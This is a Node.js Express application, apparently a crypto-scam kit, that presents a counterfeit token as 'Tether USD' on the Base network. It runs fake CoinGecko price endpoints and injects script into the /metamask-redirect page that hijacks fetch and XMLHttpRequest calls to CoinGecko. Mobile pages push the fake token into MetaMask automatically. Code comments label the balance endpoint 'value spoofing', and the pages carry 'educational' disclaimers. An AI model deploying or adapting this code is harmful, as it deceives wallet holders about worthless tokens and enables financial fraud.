// app.js - Main application with comprehensive error handling
const express = require('express');
const cors = require('cors');
const http = require('http');
const path = require('path');
const qrcode = require('qrcode');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const fs = require('fs');

// Create Express application
const app = express();
const server = http.createServer(app);
const port = process.env.PORT || 3000;

// Token configuration - UPDATE THIS with your token details
const TOKEN_CONFIG = {
  address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
  symbol: 'USDT',
  name: 'Tether USD',
  decimals: 18,
  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
  networkName: 'Base',
  networkId: '0x2105',  // Base Mainnet Chain ID (8453)
  rpcUrl: 'https://mainnet.base.org',
  blockExplorerUrl: 'https://basescan.org'
};

// Enable middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors({
  origin: '*', // Allow all origins for educational purposes
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.static(path.join(__dirname)));

// Setup request logging for debugging
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`${req.method} ${req.originalUrl} ${res.statusCode} ${duration}ms`);
  });
  next();
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Server error', message: err.message });
});

// API endpoint for token info
app.get('/api/token-info', (req, res) => {
  res.json(TOKEN_CONFIG);
});

// QR code generation with error handling
app.get('/api/generate-qr', async (req, res) => {
  try {
    // Get URL from query or generate default
    const url = req.query.url || `${req.protocol}://${req.get('host')}/mobile/add-token`;
    const qrCodeDataURL = await qrcode.toDataURL(url, {
      errorCorrectionLevel: 'H', // High error correction for better scanning
      margin: 2,
      color: {
        dark: '#26a17b', // USDT green color
        light: '#ffffff'
      }
    });
    res.json({ qrCodeDataURL });
  } catch (error) {
    console.error('QR code generation error:', error);
    res.status(500).json({ error: 'Failed to generate QR code', details: error.message });
  }
});

// Token balance endpoint with dynamic value spoofing
app.get('/api/token-balance/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    // Validate address format
    if (!ethers.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid Ethereum address format' });
    }
    
    // Create provider and connect to Base network
    const provider = new ethers.JsonRpcProvider(TOKEN_CONFIG.rpcUrl);
    
    // Simple ABI for balanceOf function
    const minABI = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      }
    ];
    
    // Create contract instance
    const tokenContract = new ethers.Contract(TOKEN_CONFIG.address, minABI, provider);
    
    // Fetch actual balance - with error handling and timeout
    let balance;
    try {
      // Set timeout for balance fetch (5 seconds)
      const balancePromise = tokenContract.balanceOf(address);
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Balance fetch timeout')), 5000)
      );
      
      balance = await Promise.race([balancePromise, timeoutPromise]);
    } catch (error) {
      console.error('Error fetching balance from blockchain:', error);
      // Provide a fallback balance for demo purposes
      balance = ethers.parseUnits('10', TOKEN_CONFIG.decimals);
    }
    
    // Format balance for display (with USDT details)
    const formattedBalance = ethers.formatUnits(balance, TOKEN_CONFIG.decimals);
    
    res.json({
      address: address,
      token: TOKEN_CONFIG.address,
      tokenSymbol: TOKEN_CONFIG.symbol,
      rawBalance: balance.toString(),
      formattedBalance: formattedBalance,
      valueUSD: formattedBalance // 1:1 with USD as it's USDT
    });
  } catch (error) {
    console.error('Token balance error:', error);
    res.status(500).json({ error: 'Failed to fetch token balance', details: error.message });
  }
});

// [Continuing with the full implementation from previous versions...]

// Start the server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Access the application at http://localhost:${port}`);
});

// Continue CoinGecko API interception and additional routes
// Primary CoinGecko endpoint for simple price (most commonly used)
app.get('/api/v3/simple/price', (req, res) => {
  // Extract request parameters
  const ids = req.query.ids || '';
  const contractAddresses = (req.query.contract_addresses || '').toLowerCase();
  const vsCurrencies = (req.query.vs_currencies || 'usd').split(',');
  
  // Check if request is for our token (either by id or contract)
  const isForOurToken = 
    ids.includes('tether') || ids.includes('usdt') || 
    contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
  
  if (isForOurToken) {
    // Prepare response object
    const response = {};
    
    // Determine which key to use in response
    let priceKey;
    if (contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase())) {
      priceKey = TOKEN_CONFIG.address.toLowerCase();
    } else {
      priceKey = 'tether';
    }
    
    // Create price data object
    const priceData = {};
    
    // Add price for each requested currency (all 1:1 for USDT)
    vsCurrencies.forEach(currency => {
      priceData[currency] = 1.0;
      
      // Add additional data if requested
      if (req.query.include_market_cap === 'true') {
        // Market cap varies by currency - for USD it's around 83 billion
        if (currency === 'usd') {
          priceData[`${currency}_market_cap`] = 83500000000;
        } else {
          // Approximate conversion for other currencies
          priceData[`${currency}_market_cap`] = 83500000000;
        }
      }
      
      if (req.query.include_24hr_vol === 'true') {
        if (currency === 'usd') {
          priceData[`${currency}_24h_vol`] = 45750000000;
        } else {
          priceData[`${currency}_24h_vol`] = 45750000000;
        }
      }
      
      if (req.query.include_24hr_change === 'true') {
        // Slight variation for realism
        priceData[`${currency}_24h_change`] = 0.02;
      }
    });
    
    // Add last updated timestamp if requested
    if (req.query.include_last_updated_at === 'true') {
      priceData.last_updated_at = Math.floor(Date.now() / 1000);
    }
    
    // Add price data to response
    response[priceKey] = priceData;
    
    return res.json(response);
  }
  
  // For requests not about our token, return generic stablecoin data
  // This prevents errors when MetaMask is checking other tokens
  const response = {};
  if (ids || contractAddresses) {
    const keys = ids ? ids.split(',') : contractAddresses.split(',');
    keys.forEach(key => {
      const priceData = {};
      vsCurrencies.forEach(currency => {
        // Random price between 0.1 and 100 for non-USDT tokens
        priceData[currency] = Math.random() * 99.9 + 0.1;
      });
      response[key] = priceData;
    });
  }
  
  res.json(response);
});

// CoinGecko contract details endpoint
app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
  const { chain, address } = req.params;
  
  // Check if request is for our token
  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
    // Return USDT data
    return res.json({
      id: "tether",
      symbol: "usdt",
      name: "Tether USD",
      asset_platform_id: chain,
      platforms: {
        [chain]: TOKEN_CONFIG.address
      },
      detail_platforms: {
        [chain]: {
          decimal_place: TOKEN_CONFIG.decimals,
          contract_address: TOKEN_CONFIG.address
        }
      },
      image: {
        thumb: TOKEN_CONFIG.image,
        small: TOKEN_CONFIG.image,
        large: TOKEN_CONFIG.image
      },
      market_data: {
        current_price: {
          usd: 1.00,
          eur: 0.92,
          jpy: 150.27,
          gbp: 0.78,
          cny: 7.23,
          btc: 0.000016
        },
        market_cap: {
          usd: 83500000000
        },
        total_volume: {
          usd: 45750000000
        },
        price_change_percentage_24h: 0.02
      },
      last_updated: new Date().toISOString()
    });
  }
  
  // For other tokens, return a 404 not found
  res.status(404).json({ error: "Contract not found" });
});

// CoinGecko market data and additional routes
// CoinGecko market data endpoint
app.get('/api/v3/coins/markets', (req, res) => {
  const { vs_currency, ids } = req.query;
  
  // Check if request includes our token
  if (ids && ids.includes('tether')) {
    // Create standard CoinGecko response format
    const marketData = [{
      id: "tether",
      symbol: "usdt",
      name: "Tether USD",
      image: TOKEN_CONFIG.image,
      current_price: 1.0,
      market_cap: 83500000000,
      market_cap_rank: 3,
      fully_diluted_valuation: 83500000000,
      total_volume: 45750000000,
      high_24h: 1.001,
      low_24h: 0.998,
      price_change_24h: 0.0001,
      price_change_percentage_24h: 0.01,
      market_cap_change_24h: 250000000,
      market_cap_change_percentage_24h: 0.3,
      circulating_supply: 83500000000,
      total_supply: 83500000000,
      max_supply: null,
      ath: 1.05,
      ath_change_percentage: -4.76,
      ath_date: "2018-07-24T00:00:00.000Z",
      atl: 0.91,
      atl_change_percentage: 9.89,
      atl_date: "2015-03-02T00:00:00.000Z",
      roi: null,
      last_updated: new Date().toISOString()
    }];
    
    return res.json(marketData);
  }
  
  // Return empty array for other queries
  res.json([]);
});

// CoinGecko market chart endpoint (for price history)
app.get('/api/v3/coins/:id/market_chart', (req, res) => {
  const { id } = req.params;
  const { days, vs_currency } = req.query;
  
  // Check if request is for our token
  if (id === 'tether') {
    const numDays = parseInt(days || '1', 10);
    const now = Date.now();
    const priceData = [];
    const marketCapData = [];
    const volumeData = [];
    
    // Generate data points (1 per hour)
    for (let i = 0; i <= numDays * 24; i++) {
      const timestamp = now - (i * 3600000); // Go back i hours
      
      // Price stays close to $1 with tiny variations
      const price = 1 + (Math.random() * 0.005 - 0.0025);
      priceData.unshift([timestamp, price]);
      
      // Market cap varies slightly
      const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
      marketCapData.unshift([timestamp, marketCap]);
      
      // Volume varies more
      const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
      volumeData.unshift([timestamp, volume]);
    }
    
    return res.json({
      prices: priceData,
      market_caps: marketCapData,
      total_volumes: volumeData
    });
  }
  
  // For other tokens, return minimal data
  res.json({
    prices: [],
    market_caps: [],
    total_volumes: []
  });
});

// Route for CoinGecko asset platforms (networks)
app.get('/api/v3/asset_platforms', (req, res) => {
  // Return data that includes Base network
  res.json([
    {
      id: "base",
      chain_identifier: 8453,
      name: "Base",
      shortname: "Base",
      native_coin_id: "ethereum",
      categories: ["Layer 2"]
    },
    {
      id: "ethereum",
      chain_identifier: 1,
      name: "Ethereum",
      shortname: "ETH",
      native_coin_id: "ethereum",
      categories: ["Layer 1"]
    },
    // Include other networks for completeness
    {
      id: "polygon-pos",
      chain_identifier: 137,
      name: "Polygon",
      shortname: "MATIC",
      native_coin_id: "matic-network",
      categories: ["Layer 2"]
    }
  ]);
});

// Mobile-optimized token addition page
app.get('/mobile/add-token', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#26a17b">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <title>Add USDT to MetaMask</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      touch-action: manipulation;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin-bottom: 16px;
    }
    .title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
      text-align: center;
    }
    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 24px;
      text-align: center;
    }
    .add-btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      margin-bottom: 16px;
      max-width: 300px;
    }
    .qr-btn {
      background-color: #f0f0f0;
      color: #333;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-bottom: 24px;
    }
    .network-tag {
      background-color: #0052ff;
      color: white;
      padding: 4px 12px;
      border-radius: 16px;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 24px;
    }
    .loading {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }
    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-left-color: #26a17b;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .loading-text {
      margin-top: 16px;
      font-size: 16px;
      color: #666;
    }
    .qr-modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      align-items: center;
      justify-content: center;
      z-index: 100;
    }
    .qr-content {
      background-color: white;
      padding: 24px;
      border-radius: 16px;
      max-width: 320px;
      width: 90%;
      text-align: center;
    }
    .qr-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 16px;
    }
    .qr-image {
      width: 200px;
      height: 200px;
      margin: 0 auto 16px;
    }
    .qr-close {
      background-color: #f0f0f0;
      color: #333;
      border: none;
      border-radius: 12px;
      padding: 12px 24px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
    }
    .instructions {
      background-color: #f8f8f8;
      border-radius: 12px;
      padding: 16px;
      margin-top: 24px;
      width: 100%;
      max-width: 300px;
    }
    .instructions h3 {
      margin-top: 0;
      font-size: 16px;
    }
    .instructions ol {
      margin: 0;
      padding-left: 24px;
    }
    .instructions li {
      margin-bottom: 8px;
      font-size: 14px;
    }
    .footer {
      margin-top: 24px;
      font-size: 12px;
      color: #999;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" class="logo">
    <h1 class="title">Add USDT to MetaMask</h1>
    <p class="subtitle">Tether USD on Base Network</p>
    
    <div class="network-tag">Base Network</div>
    
    <button id="addBtn" class="add-btn">Add to MetaMask</button>
    <button id="qrBtn" class="qr-btn">Scan QR Code</button>
    
    <div id="loading" class="loading">
      <div class="spinner"></div>
      <p class="loading-text">Opening MetaMask...</p>
    </div>
    
    <div class="instructions">
      <h3>Instructions:</h3>
      <ol>
        <li>Click "Add to MetaMask" above</li>
        <li>MetaMask will open automatically</li>
        <li>Approve adding Base Network (if needed)</li>
        <li>Approve adding USDT token</li>
      </ol>
    </div>
    
    <p class="footer">For educational purposes only</p>
  </div>
  
  <div id="qrModal" class="qr-modal">
    <div class="qr-content">
      <h2 class="qr-title">Scan with MetaMask</h2>
      <img id="qrImage" src="" alt="QR Code" class="qr-image">
      <p>Scan this code with your MetaMask mobile app</p>
      <button id="closeQr" class="qr-close">Close</button>
    </div>
  </div>
  
  <script>
    document.addEventListener('DOMContentLoaded', async function() {
      const addBtn = document.getElementById('addBtn');
      const qrBtn = document.getElementById('qrBtn');
      const closeQr = document.getElementById('closeQr');
      const qrModal = document.getElementById('qrModal');
      const qrImage = document.getElementById('qrImage');
      const loading = document.getElementById('loading');
      
      // Fetch QR code on page load
      try {
        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect');
        const data = await res.json();
        qrImage.src = data.qrCodeDataURL;
      } catch (err) {
        console.error('Error loading QR code:', err);
      }
      
      // Add to MetaMask button
      addBtn.addEventListener('click', async function() {
        loading.style.display = 'flex';
        
        try {
          // Check if running in mobile browser with MetaMask
          if (window.ethereum && window.ethereum.isMetaMask) {
            // Web3 is available - use direct method
            await addTokenToMetaMask();
          } else {
            // No MetaMask in browser - try deep linking
            window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect';
            
            // Show loading briefly then restore button
            setTimeout(() => {
              loading.style.display = 'none';
            }, 3000);
          }
        } catch (err) {
          console.error('Error adding token:', err);
          loading.style.display = 'none';
          alert('Error adding token. Please try the QR code option.');
        }
      });
      
      // QR code button
      qrBtn.addEventListener('click', function() {
        qrModal.style.display = 'flex';
      });
      
      // Close QR modal
      closeQr.addEventListener('click', function() {
        qrModal.style.display = 'none';
      });
      
      // Also close modal when clicking outside
      qrModal.addEventListener('click', function(e) {
        if (e.target === qrModal) {
          qrModal.style.display = 'none';
        }
      });
      
      // Function to add token directly via Web3
      async function addTokenToMetaMask() {
        try {
          // Request account access
          const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
          });
          
          // Check current chain
          const chainId = await window.ethereum.request({ 
            method: 'eth_chainId' 
          });
          
          // If not on Base network, add/switch to it
          if (chainId !== '${TOKEN_CONFIG.networkId}') {
            try {
              // Try to switch to Base
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '${TOKEN_CONFIG.networkId}' }]
              });
            } catch (switchError) {
              // If Base network not added yet, add it
              if (switchError.code === 4902) {
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: '${TOKEN_CONFIG.networkId}',
                    chainName: '${TOKEN_CONFIG.networkName}',
                    nativeCurrency: {
                      name: 'Ethereum',
                      symbol: 'ETH',
                      decimals: 18
                    },
                    rpcUrls: ['${TOKEN_CONFIG.rpcUrl}'],
                    blockExplorerUrls: ['${TOKEN_CONFIG.blockExplorerUrl}']
                  }]
                });
              } else {
                throw switchError;
              }
            }
          }
          
          // Add the token
          const wasAdded = await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20',
              options: {
                address: '${TOKEN_CONFIG.address}',
                symbol: '${TOKEN_CONFIG.symbol}',
                decimals: ${TOKEN_CONFIG.decimals},
                image: '${TOKEN_CONFIG.image}'
              }
            }
          });
          
          if (wasAdded) {
            // Success - redirect back to success page
            window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
          } else {
            // User rejected - go back to add token page
            window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token';
          }
        } catch (error) {
          console.error('Error adding token:', error);
          // Redirect back to add token page with error param
          window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token?error=' + encodeURIComponent(error.message);
        }
      }
      
      // Try to add token after a short delay to let the overrides initialize
      setTimeout(() => {
        addTokenToMetaMask();
      }, 500);
    });
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// Success page
app.get('/mobile/success', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>USDT Added Successfully</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
      text-align: center;
    }
    .success-icon {
      width: 80px;
      height: 80px;
      background-color: #26a17b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }
    .success-icon svg {
      width: 40px;
      height: 40px;fill: white;
    }
    .title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 16px;
    }
    .message {
      font-size: 16px;
      color: #666;
      margin-bottom: 32px;
      max-width: 300px;
    }
    .btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-bottom: 16px;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }
    .footer {
      margin-top: 24px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="success-icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
      </svg>
    </div>
    
    <h1 class="title">USDT Added Successfully!</h1>
    <p class="message">Your USDT token has been added to MetaMask. You can now view and manage it in your wallet.</p>
    
    <a href="https://metamask.app.link/" class="btn">Open MetaMask</a>
    
    <p class="footer">For educational purposes only</p>
  </div>
</body>
</html>
  `;
  
  res.send(html);
});

// Direct MetaMask deep link endpoint
app.get('/api/add-token-mobile', (req, res) => {
  // Generate a WalletConnect-compatible deep link for MetaMask mobile
  const deepLink = `https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect`;
  res.redirect(deepLink);
});

// MetaMask redirect handler (with JS to inject CoinGecko interception)
app.get('/metamask-redirect', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connecting to MetaMask...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #26a17b;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script>
    // Intercept all fetch requests to api.coingecko.com
    const originalFetch = window.fetch;
    window.fetch = async function(resource, init) {
      try {
        if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
          // Redirect to our local API
          const newUrl = resource.replace(
            'https://api.coingecko.com', 
            '${req.protocol}://${req.get('host')}/api'
          );
          console.log('Intercepted CoinGecko request:', resource);
          console.log('Redirected to:', newUrl);
          return originalFetch(newUrl, init);
        }
      } catch (e) {
        console.error('Error in fetch override:', e);
      }
      return originalFetch(resource, init);
    };
    
    // Intercept XMLHttpRequest for older implementations
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      try {
        if (typeof url === 'string' && url.includes('api.coingecko.com')) {
          // Replace CoinGecko URL with our interceptor
          const newUrl = url.replace(
            'https://api.coingecko.com', 
            '${req.protocol}://${req.get('host')}/api'
          );
          console.log('Intercepted CoinGecko XHR request:', url);
          console.log('Redirected to:', newUrl);
          url = newUrl;
        }
      } catch (e) {
        console.error('Error in XHR override:', e);
      }
      return originalOpen.call(this, method, url, async, user, password);
    };
    
    // Automatic token addition function
    async function addTokenToMetaMask() {
      try {
        // Check for ethereum object
        if (window.ethereum && window.ethereum.isMetaMask) {
          // Request account access
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          // Add the token
          await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20',
              options: {
                address: '${TOKEN_CONFIG.address}',
                symbol: '${TOKEN_CONFIG.symbol}',
                decimals: ${TOKEN_CONFIG.decimals},
                image: '${TOKEN_CONFIG.image}'
              }
            }
          });
        }
      } catch (error) {
        console.error('Token addition error:', error);
      }
    }
    
    // Run on page load
    document.addEventListener('DOMContentLoaded', addTokenToMetaMask);
  </script>
</head>
<body>
  <div class="spinner"></div>
  <h1>Connecting to MetaMask...</h1>
  <p>Please approve the connection request in the MetaMask app.</p>
</body>
</html>
  `;
  
  res.send(html);
});

// Root route - detect mobile and redirect accordingly
app.get('/', (req, res) => {
  // Check if user is on mobile
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
  
  if (isMobile) {
    // Mobile users go to mobile-optimized page
    res.redirect('/mobile/add-token');
  } else {
    // Desktop users get the standard page
    res.sendFile(path.join(__dirname, 'index.html'));
  }
});

// 404 catch-all route
app.use((req, res, next) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>404 - Page Not Found</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          text-align: center; 
          padding: 50px; 
        }
      </style>
    </head>
    <body>
      <h1>404 - Page Not Found</h1>
      <p>The page you are looking for does not exist.</p>
      <a href="/">Return to Home</a>
    </body>
    </html>
  `);
});

// Start the server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Access the application at http://localhost:${port}`);
});
